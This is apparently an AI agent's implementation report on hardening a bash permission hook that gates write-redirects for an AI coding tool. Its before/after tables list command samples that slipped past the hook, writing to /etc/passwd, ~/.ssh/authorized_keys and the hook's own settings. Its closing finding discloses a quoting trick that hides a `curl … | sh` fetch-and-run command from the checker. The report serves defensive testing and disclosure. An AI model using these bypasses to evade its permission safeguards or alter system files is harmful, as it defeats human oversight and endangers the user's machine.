
# Implementation Report - 41-01 The redirect gate reads the target bash will write to

## Summary

The write-redirect gate now checks the target bash will actually write to. The parser reads the whole operand word from the source, applies shell quote removal while tracking what was quoted, and flags a word unresolvable when its value can't be known. It also scans the redirects inside a substitution that is itself the target. In the gate, the lenient fallback now does what its docstring promised: it rejects a `..` anywhere in the target, tilde-expands the prefix, and refuses a `~` it cannot expand. The gate also refuses redirects into the hook's own settings (brd D4). Every brd §1.3 row that returned `allow` now returns `ask` / `risk`, and `(ls 2>/dev/null) | grep a` no longer asks. All of this was tested against the **repo copy** only. `install.sh` was not run, as the brief instructed.

## Files Created

- None. (Scratch scripts live in `/tmp/41-01-mut/`, outside the repo.)

## Files Modified

- `.claude/hooks/bash_command_parser.py`
  - New module-level `RedirectTarget` NamedTuple with the fields `text`, `offset`, `unresolvable`, `anchor_len`, `literal` and `fd_pipe`.
  - New `extract_write_redirect_words()`. This is the sibling method the task allowed for.
  - `extract_write_redirect_targets()` keeps its public `(text, offset)` shape and is now a projection of the new method.
  - `_scan_write_targets` was rewritten. For each write REDIRECT token it finds where the operand starts in the source (`_redirect_operand_start`, which handles fd-prefixed forms and the `>&`/`&>` synonym) and reads the word from there (`_read_redirect_word`). Every CMD_SUBST token is still recursed into. The old target branch `continue`d before it reached them; that path is gone.
  - New helpers: `_dollar_expansion_end` and `_scan_param_brace`.
  - `_strip_quotes` was removed. It had no other caller.
  - The tokenizer was **not** changed.
- `.claude/hooks/pretool_hook.py`
  - New `_judge_redirect_word()`, now used by both gate callers: `validate_bash_command` and the trap-handler gate. It does the following:
    - a word that is only a process substitution counts as the `/dev/fd` pipe sink;
    - a literal word is resolved with no expansion;
    - a resolvable word goes through constant expansion and then `_is_redirect_target_allowed`;
    - an unresolvable word is judged only by its parser-measured anchor (after constant expansion), through `_literal_prefix_inside_allowed_roots`.
  - New `_protected_write_paths()` and `_is_protected_write_path()` (D4). Protected: `<root>/.claude/settings.json`, `<root>/.claude/settings.local.json` and `<root>/.claude/hooks/` for every root in `_allowed_roots()`, plus all of `~/.claude/`. Paths are compared as realpaths.
  - `_is_redirect_target_allowed(target, literal=False)` checks protected paths before the root check.
  - `_literal_prefix_inside_allowed_roots(target, prefix=None)` now:
    - refuses `..` in any segment of the target;
    - tilde-expands a leading `~`/`~user` in the prefix;
    - refuses a tilde that does not expand, and refuses when the unknown construct sits inside the tilde-prefix;
    - refuses when the literal directory or the prefix itself is a protected path.
- `tests/test_integration_pretool.py` — 24 new `test_41_*` tests in `TestRedirectTargets`. They cover every row of the task's test table at both the parser level and the validator level (`decision`, `ask_kind`, `redirect_targets`). Every target that should be refused lies outside `/tmp`, under `/etc` or a patched `HOME=/home/fakeuser41`, and `V` is removed from the environment.

## Verification

- Compile/import: PASS. Ran `python3 -m py_compile` on both hooks and imported both modules; the suite imports them too.
- Tests: `python3 tests/run_all_tests.py` gives **2034 tests, OK (skipped=2)**. That is the baseline's 2010 plus the 24 new tests. The skips are the same two as the baseline (see below).
- `tests/test_integration_pretool.py` on its own (pytest): 431 passed.
- Installed (`install.sh --yes` re-run): **no**, by instruction. The orchestrator installs after 41-03. Everything here ran against the repo copy.

## Testing baseline

Measured on the clean tree (only the orchestrator's `state.md` status cell modified) **before the first edit**:

- `python3 tests/run_all_tests.py` gives **`Ran 2010 tests` / `OK (skipped=2)`**.
- Skipped:
  1. `test_unit_python_compat.TestImportUnderOldInterpreter.test_all_hook_modules_import`, because there is no pre-3.11 interpreter with tomli available.
  2. `test_unit_amux_spawn.TestLiveSpawn.test_headless_spawn`, a live spawn test that needs tmux and model auth (`AMUX_SPAWN_LIVE_TEST=1`).

After the change:

- `python3 tests/run_all_tests.py` gives **`Ran 2034 tests` / `OK (skipped=2)`**.
- The same two tests are skipped. The +24 is exactly the new `test_41_*` tests.

## Before/after

Run in-process against the **repo copy**:

- Setup: `BashPermissionValidator(SettingsLoader(<repo>), BashCommandParser(), <repo>)` plus `build_pretool_output(result, "default")`, i.e. this repo's real settings, workspace = repo root, `permission_mode: default`. The emitted decision equals `decision` in every row.
- Why not the hook as a process: that would add 25 rows to `~/.claude/bash_manual_confirm.log`, which 41-04 tallies.
- `V` was unset; `HOME` was the real one.

| brd | Command | Before: decision / ask_kind / redirect_targets | After: decision / ask_kind / redirect_targets |
|---|---|---|---|
| i | `echo hi > $(echo ~/.bashrc)` | allow / None / `[]` | ask / risk / `["$(echo ~/.bashrc)"]` |
| i | `ls >"$(echo /etc/x)"` | allow / None / `[]` | ask / risk / `["$(echo /etc/x)"]` |
| i | `echo hi > x$(echo y)/../../../../../home/anton/.bashrc` | allow / None / `[]` | ask / risk / `["x$(echo y)/../../../../../home/anton/.bashrc"]` |
| ii | `echo hi > $(echo x > /etc/passwd)` | allow / None / `[]` | ask / risk / `["$(echo x > /etc/passwd)", "/etc/passwd"]` |
| ii | ``echo hi > `echo x > /etc/passwd` `` | allow / None / `[]` | ask / risk / ``["`echo x > /etc/passwd`", "/etc/passwd"]`` |
| ii | `echo hi > "$(echo x > /etc/passwd)"` | allow / None / `[]` | ask / risk / `["$(echo x > /etc/passwd)", "/etc/passwd"]` |
| ii | `echo hi > >(cat > /etc/x)` | allow / None / `[]` | ask / risk / `["/etc/x"]` |
| iii | `echo x > "/etc"/x` | allow / None / `[]` | ask / risk / `["/etc/x"]` |
| iii | `echo x > ""/etc/x` | allow / None / `[]` | ask / risk / `["/etc/x"]` |
| iii | `echo x > '/etc/x'y` | allow / None / `[]` | ask / risk / `["/etc/xy"]` |
| iii | `echo x > \/etc/x` | allow / None / `[]` | ask / risk / `["/etc/x"]` |
| iii | `echo x > "$HOME"/.bashrc` | allow / None / `[]` | ask / risk / `["$HOME/.bashrc"]` |
| iii | `echo x > ~/.bashrc"$V"` | allow / None / `[]` | ask / risk / `["~/.bashrc$V"]` |
| iii | `echo x > {/etc/x,}` | allow / None / `[]` | ask / risk / `["{/etc/x,}"]` |
| iii | `echo x > ~-/x` | allow / None / `[]` | ask / risk / `["~-/x"]` |
| iii | `echo x > ~+/x` | allow / None / `[]` | ask / risk / `["~+/x"]` |
| iii | `echo x > /etc/x*` | ask / risk / `["/etc/x*"]` | ask / risk / `["/etc/x*"]` (already asked: `/etc` is outside; now asks because it is unresolvable, judged on its anchor `/etc/x`) |
| iv | `echo k >> ~/.ssh/authorized_keys$V` | allow / None / `[]` | ask / risk / `["~/.ssh/authorized_keys$V"]` |
| iv | `echo k >> ~/.bashrc$V` | allow / None / `[]` | ask / risk / `["~/.bashrc$V"]` |
| iv | `echo k >> .$V/../../../../../home/anton/.bashrc` | allow / None / `[]` | ask / risk / `[".$V/../../../../../home/anton/.bashrc"]` |
| iv (control) | `echo k >> /etc/$V` | ask / risk / `["/etc/$V"]` | ask / risk / `["/etc/$V"]` |
| v | `echo x > .claude/settings.local.json` | allow / None / `[]` | ask / risk / `[".claude/settings.local.json"]` |
| v | `echo x >> .claude/settings.json` | allow / None / `[]` | ask / risk / `[".claude/settings.json"]` |
| v | `echo x > .claude/hooks/y` | allow / None / `[]` | ask / risk / `[".claude/hooks/y"]` |
| §1.2 paren | `(ls 2>/dev/null) \| grep a` | ask / risk / `["/dev/null)"]` | allow / None / `[]` |

Acceptance 1 (41-01 part) and acceptance 2 are met on the repo copy.

## Mutation proofs

Protocol for every mutation:

1. `git status --short` (recorded).
2. `cp <file> /tmp/41-01-mut/<basename>.bak`.
3. Apply a single targeted string replacement.
4. Run the named test, which must FAIL.
5. Restore with `cp` from the backup.
6. Byte-compare the file against the backup, check that `git status --short` matches the pre-mutation output, and re-run the test, which must PASS.

No `git checkout` / `stash` / `restore` was used. The driver is `/tmp/41-01-mut/mutate.py` and the full log is in `/tmp/41-01-mut/mutation_log.txt`.

One protocol hazard: the first pass of M5 falsely "survived". The mutation (`target` → `prefix`) left the file the same size and was written within the same second as the previous restore, so pytest loaded a **stale `.pyc`**. The final run uses `PYTHONPYCACHEPREFIX=$(mktemp -d)` for every pytest invocation, and all results below come from that run. Reviewers who mutate this file should do the same.

| # | Row | Mutation | Test that failed | Restored (cp, byte-identical, git status unchanged, test re-passes) |
|---|---|---|---|---|
| M1 | `$(echo ~/.bashrc)` | Parser: an unquoted command-substitution target is read as its inner text (the old token value) | `test_41_substitution_target_is_kept_in_source_form` | yes |
| M2 | inner-redirect row | Parser: tokens inside the target word's span, CMD_SUBST included, are skipped (the old `continue`) | `test_41_inner_redirect_of_a_target_substitution_is_scanned` (all 3 subtests: `$(…)`, backtick, `"$(…)"`) | yes |
| M3 | `"/etc"/x` | Parser: an unquoted `"` is kept as a literal character (stripping, not removal) | `test_41_quote_removal_finds_the_real_path` (`"/etc"/x`, `""/etc/x`) | yes |
| M4 | `~/.bashrc$V` | Gate: the lenient fallback's tilde-expansion block is deleted | `test_41_lenient_fallback_expands_the_tilde` | yes |
| M5 | `.$V/../…` | Gate: `..` is checked in the prefix only (the pre-41 code) | `test_41_lenient_fallback_refuses_dotdot_anywhere` | yes |
| M6 | `.claude/settings.local.json` | Gate: the protected-path check is removed from the resolved branch | `test_41_protected_settings_inside_the_workspace` (all 3 subtests) | yes |
| M7 | `(ls 2>/dev/null)` (D2, extra) | Parser: an unquoted `)` no longer ends the word | `test_41_subshell_paren_is_not_glued_to_the_target` | yes |

## Decisions

- **Above the tokenizer.** The word is read from the source, starting at the REDIRECT token's operand offset, by a new reader that reuses the existing balanced scanners (`_scan_paren_subst`, `_scan_backtick`, `_scan_arith`). The tokenizer, and so command matching, is untouched.
- **No token skipping.** The scan acts only on REDIRECT and CMD_SUBST tokens, so word pieces need no skipping. A REDIRECT the tokenizer reports inside a word the reader treats as one (e.g. `${x:-a > b}`) is still scanned. A spare target can only add a prompt, and this guards against the reader ever over-reading a word.
- **A quoted `"$(…)"` is not unresolvable.** The task's list says *unquoted* command substitution. Inside double quotes it is one field, so it stays in the text like a variable and goes through the existing lenient path: `> "/tmp/x_$(date)"` is still allowed, and `>"$(echo /etc/x)"` has an empty anchor and is refused.
- **Literal words.** A word with no expansion at all (e.g. `'$HOME'/x`) is resolved with no `expanduser`/`expandvars`. A quoted `$` or backtick mixed with a real expansion makes the word unresolvable, because the text can no longer show which `$` is real. A quoted leading `~` is emitted as `./~…`. This names the same path while stopping the gate from expanding it, and is why the parser-level target for `'~'/x` is `./~/x`.
- **Also unresolvable**, beyond the task's list and in the safe direction:
  - a `~` tilde-prefix that carries quotes, an expansion or glob characters, and `~N`;
  - `$'…'` with backslash escapes (not decoded);
  - extglob `(`;
  - any unquoted `{` (rather than parsing which braces form a valid brace expansion).
- **A process-substitution target** (`> >(tee log)`, as in `exec > >(tee -a log)`) is treated as the `/dev/fd/N` pipe sink. It stays allowed, as before. Its inner command's redirects are still scanned, which is how `> >(cat > /etc/x)` asks.
- **Protected paths in the lenient path.** The protected check is applied to both the literal directory and the full literal prefix. So `.claude/hooks/$V` and `.claude/settings.local.json$V` ask, while `./$V` stays allowed. A variable that expands to `.claude/settings.json` is the same accepted residual as one expanding to `../`.
- **Fail-closed judging.** `_judge_redirect_word` wraps the judgement in `try/except` and returns "refused" on error, so a target that cannot be judged produces a prompt. The hook's fail-open convention is unchanged. Before this, an exception there (e.g. `realpath` on an embedded NUL) propagated to `main()`'s blanket handler, which exits with no decision.
- **The trap-handler gate** uses the same `_judge_redirect_word`, with no constants. So `trap 'echo x > "/etc"/x' EXIT` gets the same quote removal.
- **Unreachable fallback.** `UNREAD_REDIRECT_TARGET` is a sentinel for a write REDIRECT whose operator cannot be located at its token offset. It begins with `$`, so it is unresolvable and refused. It is not reachable with this tokenizer: 0 hits across 253 redirect-bearing test strings and a 1120-case fuzz over operator, fd prefix and spacing. It exists so that a future tokenizer change fails closed instead of reporting no write.

## Live checks owed

These need the installed copy (`./install.sh --yes`, after 41-03) and belong to 41-04:

1. Re-run the before/after table above against `~/.claude/hooks/`. It should match the "After" column. That column will differ for rows that 41-03 reclassifies as `unknown` (empty-anchor rows) and for rows that 41-02's roots change.
2. In a live session, `(ls 2>/dev/null) | grep a` raises no redirect prompt (acceptance 2).
3. In a live session in this repo, `cat > .claude/hooks/x.py <<EOF` now prompts. This was accepted in the task. Note it for agents working on this repo.
4. The trap-handler path with a quoted target (`trap 'echo x > "/etc"/x' EXIT`) asks. This is covered by the shared code path but was not exercised as its own test.

## Blockers

None.

## Questions for User

None.

## Out-of-scope finding (pre-existing, serious, not fixed here)

**The tokenizer mis-reads ANSI-C quoting `$'…'` containing `\'`, and this hides whole commands.** Measured on the repo copy with this repo's settings, before and after this change (the tokenizer was not touched):

- `echo $'\'' ; curl -s http://example.invalid | sh` gives **`allow`**, with sub-commands `["echo $'\\'' ; curl -s http://example.invalid | sh"]`.
- `echo $'\'' ; echo x > /etc/passwd` gives **`allow`**, with no redirect target.

bash 5.3.9 runs the second command: `bash -c "echo \$'\\'' ; echo SECOND"` prints `'` and then `SECOND`.

The cause: `_tokenize_with_quotes` treats `$'` as an ordinary single quote, where a backslash does not escape. The `\'` therefore closes the quote, the final `'` opens an unterminated one, and the unterminated quote swallows every separator to the end of the string. This is a command-matching fail-open in every mode, independent of the redirect gate. It needs its own task: fix the tokenizer to scan `$'…'` with backslash escapes, plus a sweep for other quote-state desyncs. The new redirect-word reader already scans `$'…'` correctly; the tokenizer does not.
